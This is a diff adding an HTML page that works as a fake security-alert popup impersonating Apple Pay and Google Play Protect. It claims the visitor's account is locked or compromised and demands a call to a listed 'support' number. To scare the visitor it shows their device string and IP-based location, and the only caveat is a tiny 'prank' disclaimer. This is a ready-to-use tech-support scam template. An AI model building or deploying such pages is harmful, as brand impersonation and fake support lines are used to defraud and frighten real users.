@@ -1,1 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Alert</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f2f2f7;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .popup {
+      background: #fff;
+      padding: 25px 20px;
+      border-radius: 16px;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.25);
+    }
+    .popup img {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+    .popup h3 {
+      font-size: 18px;
+      margin: 10px 0;
+      color: #d32f2f;
+    }
+    .popup p {
+      font-size: 15px;
+      margin: 8px 0;
+    }
+    .popup h4 {
+      color: #007aff;
+      margin: 12px 0;
+      font-size: 16px;
+    }
+    .popup .disclaimer {
+      font-size: 10px;
+      color: gray;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="popup" id="alertBox">
+      <img id="logo" src="" alt="Logo">
+      <h3 id="title">Security Alert</h3>
+      <p id="line1"></p>
+      <p id="line2"></p>
+      <p><strong id="line3"></strong></p>
+      <h4 id="phone"></h4>
+      <p id="deviceInfo">📱 Device: Detecting...</p>
+      <p id="locationInfo">📍 Location: Detecting...</p>
+      <p id="timeInfo">🕒 Time: Detecting...</p>
+      <p class="disclaimer">This is a prank page for entertainment only. Not affiliated with Apple or Google.</p>
+    </div>
+  </div>
+
+  <script>
+    function isiOS() {
+      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const userAgent = navigator.userAgent;
+      const time = new Date().toLocaleTimeString();
+
+      document.getElementById("deviceInfo").innerText = `📱 Device: ${userAgent}`;
+      document.getElementById("timeInfo").innerText = `🕒 Time: ${time}`;
+
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("locationInfo").innerText =
+            `📍 Location: ${data.city}, ${data.region}, ${data.country_name}`;
+        });
+
+      if (isiOS()) {
+        document.getElementById("logo").src = "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg";
+        document.getElementById("title").innerText = "Apple Pay - Security Alert";
+        document.getElementById("line1").innerText = "Your Apple ID has been locked due to suspicious activity.";
+        document.getElementById("line2").innerText = "Recent transaction flagged for fraud protection.";
+        document.getElementById("line3").innerText = "Immediate action is required to avoid permanent suspension.";
+        document.getElementById("phone").innerText = "📞 Call Apple Support: +1-888-555-0199";
+      } else {
+        document.getElementById("logo").src = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg";
+        document.getElementById("title").innerText = "Google Play Protect Alert";
+        document.getElementById("line1").innerText = "Suspicious activity has been detected on your Android device.";
+        document.getElementById("line2").innerText = "Play Protect has flagged unauthorized access attempts.";
+        document.getElementById("line3").innerText = "Action is required to secure your account.";
+        document.getElementById("phone").innerText = "📞 Call Android Security: +1-888-555-0199";
+      }
+    });
+  </script>
+</body>
+</html>
 
